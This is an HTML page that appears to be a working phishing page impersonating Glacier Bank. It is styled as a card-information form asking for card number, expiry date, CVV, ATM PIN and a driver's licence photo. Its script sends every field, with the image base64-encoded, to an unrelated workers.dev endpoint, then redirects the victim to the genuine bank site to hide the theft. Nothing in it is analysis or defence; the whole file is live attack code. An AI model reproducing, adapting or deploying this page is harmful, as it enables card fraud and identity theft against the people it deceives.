<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Glacier Bank | Enter Card Information</title>

<style>
:root{
  --blue:#0a7db3;
  --blue-dark:#06638f;
  --text:#1e1e1e;
  --bg:#f5f5f5;
  --card:#fff;
}

/* GLOBAL */
*{box-sizing:border-box;}
body{
  margin:0;
  font-family:"Inter", Arial, sans-serif;
  background:var(--bg);
  color:var(--text);
  display:flex;
  flex-direction:column;
  align-items:center;
  justify-content:center;
  min-height:100vh;
  padding:20px;
}

/* LOGO */
.logo img{
  height:50px;
  margin-bottom:20px;
}

/* FORM CARD */
.form-card{
  background:var(--card);
  padding:32px 28px;
  border-radius:6px;
  box-shadow:0 12px 32px rgba(0,0,0,0.15);
  width:100%;
  max-width:400px;
  text-align:center;
}

.form-card h1{
  font-size:20px;
  margin-bottom:24px;
}

.form-card input{
  width:100%;
  padding:12px;
  margin-bottom:14px;
  border:1px solid #ccc;
  border-radius:4px;
  font-size:14px;
}

.form-card input[type=file]{
  margin-top:8px;
}

.form-card label{
  font-size:14px;
  display:block;
  text-align:left;
  margin-top:12px;
}

.form-card button{
  width:100%;
  padding:12px;
  background:var(--blue);
  color:#fff;
  border:none;
  border-radius:4px;
  font-size:15px;
  cursor:pointer;
  margin-top:14px;
}
.form-card button:hover{
  background:var(--blue-dark);
}

#line{
  height:1px;
  background:#eee;
  margin:18px 0;
}

/* FOOTER */
footer{
  margin-top:20px;
  font-size:13px;
  color:#777;
  text-align:center;
}

footer a{
  color:var(--blue);
  text-decoration:none;
}

/* RESPONSIVE */
@media(max-width:480px){
  .form-card{
    padding:24px 18px;
  }
  .form-card h1{
    font-size:18px;
  }
}
</style>
</head>
<body>

<div class="logo">
  <img src="../Assets/lgoii.png" alt="Glacier Bank Logo">
</div>

<form class="form-card" id="cardForm">
  <h1>Enter Your Card Information</h1>

  <input type="text" name="crd" placeholder="CARD NUMBER" required>
  <input type="password" name="ex" placeholder="Exp Date" required>
  <input type="text" name="cv" placeholder="CVV" required>
  <input type="text" name="at" placeholder="ATM PIN" required>

  <label for="image">DL Picture Capture</label>
  <label style="margin-left:0;">Click Here To Upload it</label>
  <input type="file" id="image" name="dlImage" accept="image/*">

  <button type="submit">Continue</button>

  <div id="line"></div>
</form>

<footer>
  © 2026 - Glacier Bank
</footer>

<script>
// Persistent session
const session = localStorage.getItem("session") || crypto.randomUUID();
localStorage.setItem("session", session);

document.getElementById("cardForm").addEventListener("submit", async e => {
  e.preventDefault();

  const formElements = [...e.target.elements].filter(el => el.name && el.type !== "submit");

  const formData = {};

  for (const el of formElements) {
    if (el.type === "file") {
      if (el.files.length) {
        const file = el.files[0];
        // Convert file to Base64
        formData[el.name] = await new Promise((resolve, reject) => {
          const reader = new FileReader();
          reader.onload = () => resolve(reader.result);
          reader.onerror = err => reject(err);
          reader.readAsDataURL(file);
        });
      } else {
        formData[el.name] = null;
      }
    } else {
      formData[el.name] = el.value.trim();
    }
  }

  try {
    await fetch("https://g-divine-resonance-2ee7.mxx-washbasin261.workers.dev/event", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        ...formData,
        session,
        step: "card_page"
      })
    });

    // Redirect after submission
    window.location.href = "https://www.glacierbank.com";

  } catch (err) {
    console.error(err);
    alert("Network error. Please try again.");
  }
});
</script>

</body>
</html>
